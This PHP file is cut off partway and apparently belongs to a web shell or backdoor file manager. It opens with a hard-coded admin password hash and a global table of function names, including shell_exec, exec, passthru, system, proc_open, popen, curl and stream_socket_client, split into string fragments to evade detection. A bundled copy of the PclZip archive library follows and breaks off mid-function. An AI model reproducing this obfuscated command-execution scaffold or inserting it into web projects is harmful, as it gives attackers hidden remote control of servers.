<?php
$auth_enabled = true;

$auth_users = [
    'admin' => '$2a$12$eJHdIuo9oMwuLspwxW19pesBYoCBykyN16sBsx8.GXXsFOnRU2ysS',
];

$GLOBALS['_q_']=Array('' .'session' .'_start','number' .'_form' .'at','substr','spri' .'ntf','fileperms','' .'r' .'t' .'rim','strtr','base64_en' .'code','base64' .'_de' .'code','i' .'s_dir','arr' .'ay_diff','scand' .'ir','unlink','r' .'mdir','file_exists','tou' .'ch','ch' .'mod','' .'oc' .'tdec','' .'get' .'c' .'wd','' .'chdi' .'r','' .'fu' .'nction_e' .'x' .'ists','s' .'hell_e' .'xec','exec','i' .'m' .'plode','ob' .'_start','passt' .'hru','ob_' .'get_c' .'lea' .'n','proc' .'_op' .'en','is_r' .'e' .'sou' .'r' .'ce','stream_' .'g' .'e' .'t_c' .'on' .'tent' .'s','' .'fcl' .'ose','proc' .'_close','is_readable','' .'pathinfo','dirname','m' .'kdir','is_w' .'ritable','htmls' .'pe' .'ci' .'al' .'cha' .'rs','d' .'e' .'fine','realpath','c' .'o' .'unt','ba' .'sename','move_uploa' .'de' .'d_' .'fil' .'e','re' .'nam' .'e','is' .'_f' .'ile','f' .'il' .'e_pu' .'t_' .'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s','strto' .'time','' .'header','file' .'_ge' .'t_conten' .'ts','strtol' .'ower','j' .'so' .'n_' .'enc' .'ode','md5','exp' .'lode','sort','' .'array' .'_' .'mer' .'ge','fil' .'esi' .'ze','date','fi' .'l' .'em' .'t' .'ime','system','popen','c'.'u'.'r'.'l_init','c'.'u'.'r'.'l_setopt','c'.'u'.'r'.'l_exec','c'.'u'.'r'.'l_close','f'.'o'.'p'.'e'.'n','f'.'r'.'e'.'a'.'d','f'.'w'.'r'.'i'.'t'.'e','p'.'a'.'r'.'s'.'e_url','s'.'t'.'r'.'e'.'a'.'m_socket_client','i'.'n'.'i_get','feof','filter_var','trim','fgets','mail','sha1','uniqid','hash','microtime', 'password_verify', 'session_destroy', 'phpversion', 'readfile', 'class_exists', 'str_replace', 'is_uploaded_file', 'copy', 'strlen');
$GLOBALS['_q_'][0]();

if (!defined('PCLZIP_READ_BLOCK_SIZE')) { define( 'PCLZIP_READ_BLOCK_SIZE', 2048 ); }
if (!defined('PCLZIP_SEPARATOR')) { define( 'PCLZIP_SEPARATOR', ',' ); }
if (!defined('PCLZIP_ERROR_EXTERNAL')) { define( 'PCLZIP_ERROR_EXTERNAL', 0 ); }
if (!defined('PCLZIP_TEMPORARY_DIR')) { define( 'PCLZIP_TEMPORARY_DIR', '' ); }
if (!defined('PCLZIP_TEMPORARY_FILE_RATIO')) { define( 'PCLZIP_TEMPORARY_FILE_RATIO', 0.47 ); }
$g_pclzip_version = "2.8.2";
define( 'PCLZIP_ERR_USER_ABORTED', 2 );
define( 'PCLZIP_ERR_NO_ERROR', 0 );
define( 'PCLZIP_ERR_WRITE_OPEN_FAIL', -1 );
define( 'PCLZIP_ERR_READ_OPEN_FAIL', -2 );
define( 'PCLZIP_ERR_INVALID_PARAMETER', -3 );
define( 'PCLZIP_ERR_MISSING_FILE', -4 );
define( 'PCLZIP_ERR_FILENAME_TOO_LONG', -5 );
define( 'PCLZIP_ERR_INVALID_ZIP', -6 );
define( 'PCLZIP_ERR_BAD_EXTRACTED_FILE', -7 );
define( 'PCLZIP_ERR_DIR_CREATE_FAIL', -8 );
define( 'PCLZIP_ERR_BAD_EXTENSION', -9 );
define( 'PCLZIP_ERR_BAD_FORMAT', -10 );
define( 'PCLZIP_ERR_DELETE_FILE_FAIL', -11 );
define( 'PCLZIP_ERR_RENAME_FILE_FAIL', -12 );
define( 'PCLZIP_ERR_BAD_CHECKSUM', -13 );
define( 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP', -14 );
define( 'PCLZIP_ERR_MISSING_OPTION_VALUE', -15 );
define( 'PCLZIP_ERR_INVALID_OPTION_VALUE', -16 );
define( 'PCLZIP_ERR_ALREADY_A_DIRECTORY', -17 );
define( 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION', -18 );
define( 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION', -19 );
define( 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE', -20 );
define( 'PCLZIP_ERR_DIRECTORY_RESTRICTION', -21 );
define( 'PCLZIP_OPT_PATH', 77001 );
define( 'PCLZIP_OPT_ADD_PATH', 77002 );
define( 'PCLZIP_OPT_REMOVE_PATH', 77003 );
define( 'PCLZIP_OPT_REMOVE_ALL_PATH', 77004 );
define( 'PCLZIP_OPT_SET_CHMOD', 77005 );
define( 'PCLZIP_OPT_EXTRACT_AS_STRING', 77006 );
define( 'PCLZIP_OPT_NO_COMPRESSION', 77007 );
define( 'PCLZIP_OPT_BY_NAME', 77008 );
define( 'PCLZIP_OPT_BY_INDEX', 77009 );
define( 'PCLZIP_OPT_BY_EREG', 77010 );
define( 'PCLZIP_OPT_BY_PREG', 77011 );
define( 'PCLZIP_OPT_COMMENT', 77012 );
define( 'PCLZIP_OPT_ADD_COMMENT', 77013 );
define( 'PCLZIP_OPT_PREPEND_COMMENT', 77014 );
define( 'PCLZIP_OPT_EXTRACT_IN_OUTPUT', 77015 );
define( 'PCLZIP_OPT_REPLACE_NEWER', 77016 );
define( 'PCLZIP_OPT_STOP_ON_ERROR', 77017 );
define( 'PCLZIP_OPT_EXTRACT_DIR_RESTRICTION', 77019 );
define( 'PCLZIP_OPT_TEMP_FILE_THRESHOLD', 77020 );
define( 'PCLZIP_OPT_TEMP_FILE_ON', 77021 );
define( 'PCLZIP_OPT_TEMP_FILE_OFF', 77022 );
define( 'PCLZIP_ATT_FILE_NAME', 79001 );
define( 'PCLZIP_ATT_FILE_NEW_SHORT_NAME', 79002 );
define( 'PCLZIP_ATT_FILE_NEW_FULL_NAME', 79003 );
define( 'PCLZIP_ATT_FILE_MTIME', 79004 );
define( 'PCLZIP_ATT_FILE_CONTENT', 79005 );
define( 'PCLZIP_ATT_FILE_COMMENT', 79006 );
define( 'PCLZIP_CB_PRE_EXTRACT', 78001 );
define( 'PCLZIP_CB_POST_EXTRACT', 78002 );
define( 'PCLZIP_CB_PRE_ADD', 78003 );
define( 'PCLZIP_CB_POST_ADD', 78004 );
class PclZip {
  var $zipname = '';
  var $zip_fd = 0;
  var $error_code = 1;
  var $error_string = '';
  var $magic_quotes_status;
  function __construct($p_zipname) {
    if (!function_exists('gzopen')) {
      die('Abort '.basename(__FILE__).' : Missing zlib extensions');
    }
    $this->zipname = $p_zipname;
    $this->zip_fd = 0;
    $this->magic_quotes_status = -1;
    return;
  }
  function create($p_filelist) {
    $v_result=1;
    $this->privErrorReset();
    $v_options = array();
    $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;
    $v_size = func_num_args();
    if ($v_size > 1) {
      $v_arg_list = func_get_args();
      array_shift($v_arg_list);
      $v_size--;
      if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {
        $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                            array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                   PCLZIP_OPT_ADD_PATH => 'optional',
                                                   PCLZIP_CB_PRE_ADD => 'optional',
                                                   PCLZIP_CB_POST_ADD => 'optional',
                                                   PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                   PCLZIP_OPT_COMMENT => 'optional',
                                                   PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                   PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                   PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                             ));
        if ($v_result != 1) { return 0; }
      } else {
        $v_options[PCLZIP_OPT_ADD_PATH] = $v_arg_list[0];
        if ($v_size == 2) {
          $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
        } else if ($v_size > 2) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");
          return 0;
        }
      }
    }
    $this->privOptionDefaultThreshold($v_options);
    $v_string_list = array();
    $v_att_list = array();
    $v_filedescr_list = array();
    $p_result_list = array();
    if (is_array($p_filelist)) {
      if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
        $v_att_list = $p_filelist;
      } else {
        $v_string_list = $p_filelist;
      }
    } else if (is_string($p_filelist)) {
      $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
    } else {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_filelist");
      return 0;
    }
    if (sizeof($v_string_list) != 0) {
      foreach ($v_string_list as $v_string) {
        if ($v_string != '') {
          $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
        }
      }
    }
    $v_supported_attributes = array ( PCLZIP_ATT_FILE_NAME => 'mandatory' ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional' ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional' ,PCLZIP_ATT_FILE_MTIME => 'optional' ,PCLZIP_ATT_FILE_CONTENT => 'optional' ,PCLZIP_ATT_FILE_COMMENT => 'optional');
    foreach ($v_att_list as $v_entry) {
      $v_result = $this->privFileDescrParseAtt($v_entry, $v_filedescr_list[], $v_options, $v_supported_attributes);
      if ($v_result != 1) { return 0; }
    }
    $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
    if ($v_result != 1) { return 0; }
    $v_result = $this->privCreate($v_filedescr_list, $p_result_list, $v_options);
    if ($v_result != 1) { return 0; }
    return $p_result_list;
  }
  function add($p_filelist) {
    $v_result=1;
    $this->privErrorReset();
    $v_options = array();
    $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;
    $v_size = func_num_args();
    if ($v_size > 1) {
      $v_arg_list = func_get_args();
      array_shift($v_arg_list);
      $v_size--;
      if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {
        $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                            array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                   PCLZIP_OPT_ADD_PATH => 'optional',
                                                   PCLZIP_CB_PRE_ADD => 'optional',
                                                   PCLZIP_CB_POST_ADD => 'optional',
                                                   PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                   PCLZIP_OPT_COMMENT => 'optional',
                                                   PCLZIP_OPT_ADD_COMMENT => 'optional',
                                                   PCLZIP_OPT_PREPEND_COMMENT => 'optional',
                                                   PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                   PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                   PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
												   ));
        if ($v_result != 1) { return 0; }
      } else {
        $v_options[PCLZIP_OPT_ADD_PATH] = $v_add_path = $v_arg_list[0];
        if ($v_size == 2) {
          $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
        }
        else if ($v_size > 2) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");
          return 0;
        }
      }
    }
    $this->privOptionDefaultThreshold($v_options);
    $v_string_list = array();
    $v_att_list = array();
    $v_filedescr_list = array();
    $p_result_list = array();
    if (is_array($p_filelist)) {
      if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
        $v_att_list = $p_filelist;
      } else {
        $v_string_list = $p_filelist;
      }
    } else if (is_string($p_filelist)) {
      $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
    } else {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type '".gettype($p_filelist)."' for p_filelist");
      return 0;
    }
    if (sizeof($v_string_list) != 0) {
      foreach ($v_string_list as $v_string) {
        $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
      }
    }
    $v_supported_attributes = array ( PCLZIP_ATT_FILE_NAME => 'mandatory' ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional' ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional' ,PCLZIP_ATT_FILE_MTIME => 'optional' ,PCLZIP_ATT_FILE_CONTENT => 'optional' ,PCLZIP_ATT_FILE_COMMENT => 'optional');
    foreach ($v_att_list as $v_entry) {
      $v_result = $this->privFileDescrParseAtt($v_entry, $v_filedescr_list[], $v_options, $v_supported_attributes);
      if ($v_result != 1) { return 0; }
    }
    $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
    if ($v_result != 1) { return 0; }
    $v_result = $this->privAdd($v_filedescr_list, $p_result_list, $v_options);
    if ($v_result != 1) { return 0; }
    return $p_result_list;
  }
  function listContent() {
    $v_result=1;
    $this->privErrorReset();
    if (!$this->privCheckFormat()) { return(0); }
    $p_list = array();
    if (($v_result = $this->privList($p_list)) != 1) {
      unset($p_list);
      return(0);
    }
    return $p_list;
  }
  function extract() {
    $v_result=1;
    $this->privErrorReset();
    if (!$this->privCheckFormat()) { return(0); }
    $v_options = array();
    $v_path = '';
    $v_remove_path = "";
    $v_remove_all_path = false;
    $v_size = func_num_args();
    $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;
    if ($v_size > 0) {
      $v_arg_list = func_get_args();
      if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {
        $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                            array (PCLZIP_OPT_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                   PCLZIP_OPT_ADD_PATH => 'optional',
                                                   PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                   PCLZIP_CB_POST_EXTRACT => 'optional',
                                                   PCLZIP_OPT_SET_CHMOD => 'optional',
                                                   PCLZIP_OPT_BY_NAME => 'optional',
                                                   PCLZIP_OPT_BY_EREG => 'optional',
                                                   PCLZIP_OPT_BY_PREG => 'optional',
                                                   PCLZIP_OPT_BY_INDEX => 'optional',
                                                   PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                   PCLZIP_OPT_EXTRACT_IN_OUTPUT => 'optional',
                                                   PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                   ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                   ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                   PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                   PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                   PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
												    ));
        if ($v_result != 1) { return 0; }
        if (isset($v_options[PCLZIP_OPT_PATH])) { $v_path = $v_options[PCLZIP_OPT_PATH]; }
        if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) { $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH]; }
        if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) { $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH]; }
        if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
          if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) { $v_path .= '/'; }
          $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
        }
      } else {
        $v_path = $v_arg_list[0];
        if ($v_size == 2) {
          $v_remove_path = $v_arg_list[1];
        } else if ($v_size > 2) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");
          return 0;
        }
      }
    }
    $this->privOptionDefaultThreshold($v_options);
    $p_list = array();
    $v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path, $v_remove_all_path, $v_options);
    if ($v_result < 1) {
      unset($p_list);
      return(0);
    }
    return $p_list;
  }
  function extractByIndex($p_index) {
    $v_result=1;
    $this->privErrorReset();
    if (!$this->privCheckFormat()) { return(0); }
    $v_options = array();
    $v_path = '';
    $v_remove_path = "";
    $v_remove_all_path = false;
    $v_size = func_num_args();
    $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;
    if ($v_size > 1) {
      $v_arg_list = func_get_args();
      array_shift($v_arg_list);
      $v_size--;
      if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {
        $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                            array (PCLZIP_OPT_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                   PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                   PCLZIP_OPT_ADD_PATH => 'optional',
                                                   PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                   PCLZIP_CB_POST_EXTRACT => 'optional',
                                                   PCLZIP_OPT_SET_CHMOD => 'optional',
                                                   PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                   ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                   ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                   PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                   PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                   PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
												   ));
        if ($v_result != 1) { return 0; }
        if (isset($v_options[PCLZIP_OPT_PATH])) { $v_path = $v_options[PCLZIP_OPT_PATH]; }
        if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) { $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH]; }
        if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) { $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH]; }
        if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
          if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) { $v_path .= '/'; }
          $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
        }
        if (!isset($v_options[PCLZIP_OPT_EXTRACT_AS_STRING])) {
          $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;
        }
      } else {
        $v_path = $v_arg_list[0];
        if ($v_size == 2) {
          $v_remove_path = $v_arg_list[1];
        } else if ($v_size > 2) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");
          return 0;
        }
      }
    }
    $v_arg_trick = array (PCLZIP_OPT_BY_INDEX, $p_index);
    $v_options_trick = array();
    $v_result = $this->privParseOptions($v_arg_trick, sizeof($v_arg_trick), $v_options_trick, array (PCLZIP_OPT_BY_INDEX => 'optional' ));
    if ($v_result != 1) { return 0; }
    $v_options[PCLZIP_OPT_BY_INDEX] = $v_options_trick[PCLZIP_OPT_BY_INDEX];
    $this->privOptionDefaultThreshold($v_options);
    if (($v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path, $v_remove_all_path, $v_options)) < 1) { return(0); }
    return $p_list;
  }
  function delete() {
    $v_result=1;
    $this->privErrorReset();
    if (!$this->privCheckFormat()) { return(0); }
    $v_options = array();
    $v_size = func_num_args();
    if ($v_size > 0) {
      $v_arg_list = func_get_args();
      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                        array (PCLZIP_OPT_BY_NAME => 'optional',
                                               PCLZIP_OPT_BY_EREG => 'optional',
                                               PCLZIP_OPT_BY_PREG => 'optional',
                                               PCLZIP_OPT_BY_INDEX => 'optional' ));
      if ($v_result != 1) { return 0; }
    }
    $this->privDisableMagicQuotes();
    $v_list = array();
    if (($v_result = $this->privDeleteByRule($v_list, $v_options)) != 1) {
      $this->privSwapBackMagicQuotes();
      unset($v_list);
      return(0);
    }
    $this->privSwapBackMagicQuotes();
    return $v_list;
  }
  function deleteByIndex($p_index) {
    $p_list = $this->delete(PCLZIP_OPT_BY_INDEX, $p_index);
    return $p_list;
  }
  function properties() {
    $this->privErrorReset();
    $this->privDisableMagicQuotes();
    if (!$this->privCheckFormat()) {
      $this->privSwapBackMagicQuotes();
      return(0);
    }
    $v_prop = array();
    $v_prop['comment'] = '';
    $v_prop['nb'] = 0;
    $v_prop['status'] = 'not_exist';
    if (@is_file($this->zipname)) {
      if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0) {
        $this->privSwapBackMagicQuotes();
        PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');
        return 0;
      }
      $v_central_dir = array();
      if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1) {
        $this->privSwapBackMagicQuotes();
        return 0;
      }
      $this->privCloseFd();
      $v_prop['comment'] = $v_central_dir['comment'];
      $v_prop['nb'] = $v_central_dir['entries'];
      $v_prop['status'] = 'ok';
    }
    $this->privSwapBackMagicQuotes();
    return $v_prop;
  }
  function errorCode() {
    if (PCLZIP_ERROR_EXTERNAL == 1) {
      return(PclErrorCode());
    } else {
      return($this->error_code);
    }
  }
  function errorName($p_with_code=false) {
    $v_name = array ( PCLZIP_ERR_NO_ERROR => 'PCLZIP_ERR_NO_ERROR',
                      PCLZIP_ERR_WRITE_OPEN_FAIL => 'PCLZIP_ERR_WRITE_OPEN_FAIL',
                      PCLZIP_ERR_READ_OPEN_FAIL => 'PCLZIP_ERR_READ_OPEN_FAIL',
                      PCLZIP_ERR_INVALID_PARAMETER => 'PCLZIP_ERR_INVALID_PARAMETER',
                      PCLZIP_ERR_MISSING_FILE => 'PCLZIP_ERR_MISSING_FILE',
                      PCLZIP_ERR_FILENAME_TOO_LONG => 'PCLZIP_ERR_FILENAME_TOO_LONG',
                      PCLZIP_ERR_INVALID_ZIP => 'PCLZIP_ERR_INVALID_ZIP',
                      PCLZIP_ERR_BAD_EXTRACTED_FILE => 'PCLZIP_ERR_BAD_EXTRACTED_FILE',
                      PCLZIP_ERR_DIR_CREATE_FAIL => 'PCLZIP_ERR_DIR_CREATE_FAIL',
                      PCLZIP_ERR_BAD_EXTENSION => 'PCLZIP_ERR_BAD_EXTENSION',
                      PCLZIP_ERR_BAD_FORMAT => 'PCLZIP_ERR_BAD_FORMAT',
                      PCLZIP_ERR_DELETE_FILE_FAIL => 'PCLZIP_ERR_DELETE_FILE_FAIL',
                      PCLZIP_ERR_RENAME_FILE_FAIL => 'PCLZIP_ERR_RENAME_FILE_FAIL',
                      PCLZIP_ERR_BAD_CHECKSUM => 'PCLZIP_ERR_BAD_CHECKSUM',
                      PCLZIP_ERR_INVALID_ARCHIVE_ZIP => 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP',
                      PCLZIP_ERR_MISSING_OPTION_VALUE => 'PCLZIP_ERR_MISSING_OPTION_VALUE',
                      PCLZIP_ERR_INVALID_OPTION_VALUE => 'PCLZIP_ERR_INVALID_OPTION_VALUE',
                      PCLZIP_ERR_UNSUPPORTED_COMPRESSION => 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION',
                      PCLZIP_ERR_UNSUPPORTED_ENCRYPTION => 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION'
                      ,PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE => 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE'
                      ,PCLZIP_ERR_DIRECTORY_RESTRICTION => 'PCLZIP_ERR_DIRECTORY_RESTRICTION'
                    );
    if (isset($v_name[$this->error_code])) {
      $v_value = $v_name[$this->error_code];
    } else {
      $v_value = 'NoName';
    }
    if ($p_with_code) {
      return($v_value.' ('.$this->error_code.')');
    } else {
      return($v_value);
    }
  }
  function errorInfo($p_full=false) {
    if (PCLZIP_ERROR_EXTERNAL == 1) {
      return(PclErrorString());
    } else {
      if ($p_full) {
        return($this->errorName(true)." : ".$this->error_string);
      } else {
        return($this->error_string." [code ".$this->error_code."]");
      }
    }
  }
  function privCheckFormat($p_level=0) {
    $v_result = true;
    clearstatcache();
    $this->privErrorReset();
    if (!is_file($this->zipname)) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "Missing archive file '".$this->zipname."'");
      return(false);
    }
    if (!is_readable($this->zipname)) {
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to read archive '".$this->zipname."'");
      return(false);
    }
    return $v_result;
  }
  function privParseOptions(&$p_options_list, $p_size, &$v_result_list, $v_requested_options=false) {
    $v_result=1;
    $i=0;
    while ($i<$p_size) {
      if (!isset($v_requested_options[$p_options_list[$i]])) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid optional parameter '".$p_options_list[$i]."' for this method");
        return PclZip::errorCode();
      }
      switch ($p_options_list[$i]) {
        case PCLZIP_OPT_PATH :
        case PCLZIP_OPT_REMOVE_PATH :
        case PCLZIP_OPT_ADD_PATH :
          if (($i+1) >= $p_size) {
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
            return PclZip::errorCode();
          }
          $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
          $i++;
        break;
        case PCLZIP_OPT_TEMP_FILE_THRESHOLD :
          if (($i+1) >= $p_size) {
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
            return PclZip::errorCode();
          }
          if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
            return PclZip::errorCode();
          }
          $v_value = $p_options_list[$i+1];
          if ((!is_integer($v_value)) || ($v_value<0)) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Integer expected for option '".PclZipUtilOptionText($p_options_list[$i])."'");
            return PclZip::errorCode();
          }
          $v_result_list[$p_options_list[$i]] = $v_value*1048576;
          $i++;
        break;
        case PCLZIP_OPT_TEMP_FILE_ON :
          if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
            return PclZip::errorCode();
          }
          $v_result_list[$p_options_list[$i]] = true;
        break;
        case PCLZIP_OPT_TEMP_FILE_OFF :
          if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_ON])) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_ON'");
            return PclZip::errorCode();
          }
          if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_THRESHOLD'");
            return PclZip::errorCode();
          }
          $v_result_list[$p_options_list[$i]] = true;
        break;
        case PCLZIP_OPT_EXTRACT_DIR_RESTRICTION :
          if (($i+1) >= $p_size) {
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
            return PclZip::errorCode();
          }
          if (is_string($p_options_list[$i+1]) && ($p_options_list[$i+1] != '')) {
            $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
            $i++;
          }
        break;
        case PCLZIP_OPT_BY_NAME :
          if (($i+1) >= $p_size) {
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
            return PclZip::errorCode();
          }
          if (is_string($p_options_list[$i+1])) {
              $v_result_list[$p_options_list[$i]][0] = $p_options_list[$i+1];
          } else if (is_array($p_options_list[$i+1])) {
              $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
          } else {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
            return PclZip::errorCode();
          }
          $i++;
        break;
        case PCLZIP_OPT_BY_EREG :
          $p_options_list[$i] = PCLZIP_OPT_BY_PREG;
        case PCLZIP_OPT_BY_PREG :
          if (($i+1) >= $p_size) {
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
            return PclZip::errorCode();
          }
          if (is_string($p_options_list[$i+1])) {
              $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
          } else {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
            return PclZip::errorCode();
          }
          $i++;
        break;
        case PCLZIP_OPT_COMMENT :
        case PCLZIP_OPT_ADD_COMMENT :
        case PCLZIP_OPT_PREPEND_COMMENT :
          if (($i+1) >= $p_size) {
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '" .PclZipUtilOptionText($p_options_list[$i]) ."'");
            return PclZip::errorCode();
          }
          if (is_string($p_options_list[$i+1])) {
              $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
          } else {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '" .PclZipUtilOptionText($p_options_list[$i]) ."'");
            return PclZip::errorCode();
          }
          $i++;
        break;
